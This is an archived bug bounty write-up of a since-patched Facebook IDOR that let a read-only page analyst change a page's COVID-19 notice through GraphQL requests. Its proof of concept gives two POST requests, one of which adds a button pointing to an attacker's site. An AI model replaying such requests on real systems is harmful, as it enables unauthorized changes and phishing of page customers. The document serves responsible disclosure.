---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-04-17_poc-update-business-fyi-message-as-facebook-page-analyst.md
original_filename: 2021-04-17_poc-update-business-fyi-message-as-facebook-page-analyst.md
title: (POC) Update business fyi message as Facebook page analyst
category: documents
detected_topics:
- idor
- command-injection
- graphql
tags:
- imported
- documents
- idor
- command-injection
- graphql
language: en
raw_sha256: 5d3f566551e8e13a187f4a38d7b3f1981fa43436f7ed9059704e312fda8c9bca
text_sha256: e1df7b94c1816dd8dd34788c0e83672e74be43b52adfd0759bc0b2f02cdacdac
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# (POC) Update business fyi message as Facebook page analyst

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-04-17_poc-update-business-fyi-message-as-facebook-page-analyst.md
- Source Type: markdown
- Detected Topics: idor, command-injection, graphql
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `5d3f566551e8e13a187f4a38d7b3f1981fa43436f7ed9059704e312fda8c9bca`
- Text SHA256: `e1df7b94c1816dd8dd34788c0e83672e74be43b52adfd0759bc0b2f02cdacdac`


## Content

---
title: "(POC) Update business fyi message as Facebook page analyst"
url: "https://edmundaa222.medium.com/poc-update-business-fyi-message-as-facebook-page-analyst-d36170fdede2"
authors: ["Ahmad Talahmeh"]
programs: ["Meta / Facebook"]
bugs: ["IDOR", "GraphQL"]
bounty: "750"
publication_date: "2021-04-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3736
scraped_via: "browseros"
---

# (POC) Update business fyi message as Facebook page analyst

(POC) Update business fyi message as Facebook page analyst
Ahmad Talahmeh
Follow
1 min read
·
Apr 18, 2021

41

Press enter or click to view image in full size
Description / Impact

In a FB5 there is an update related to COVID-19 which allow a page to pending there customer service as a result of Coronavirus, this action require high permission to be made on behalf the page but according to my testing I observe that it ‘s possible to update business fyi message with the analyst permissions.

Get Ahmad Talahmeh’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

This behavior is unexpected since the analyst permissions is generally read-only permissions.

Proof Of Concept / Reprosteps
Obtain the page ID
Submit the request
HTTP POST /api/graphql/?av=valueObtainedFromStepOne 
Host: facebook.com
variables={"input":{"business_fyi_message_type":"POLICY_UPDATES","end_point":"settings_page_info","entry_point":"page_settings","page_id":"valueObtainedFromStepOne","actor_id":"valueObtainedFromStepOne","client_mutation_id":"4"}}&doc_id=2964825706964540
Display a button that links to your own URL
HTTP POST /api/graphql/?av=valueObtainedFromStepOne 
Host: facebook.com
variables={"input":{"business_fyi_link":"https://www.attackerSite.com/","end_point":"settings_page_info","entry_point":"page_settings","page_id":"ValueFromStepOne","actor_id":"ValueFromStepOne","client_mutation_id":"1"}}&doc_id=2674516042648125
The business fyi message has been updated as analyst.
The message which displayed for the customers:

Coronavirus (COVID-19) Update From {page name}

Due to challenges caused by coronavirus (COVID-19), we’re providing our customers with extra support and resources

Visit {URL button}

Timeline:
13/08/2020: Report Sent
Triaged By Facebook after 10 hours.
25/08/2020: Patch confirmed by Facebook
27/08/2020: $750 Bounty awarded by Facebook
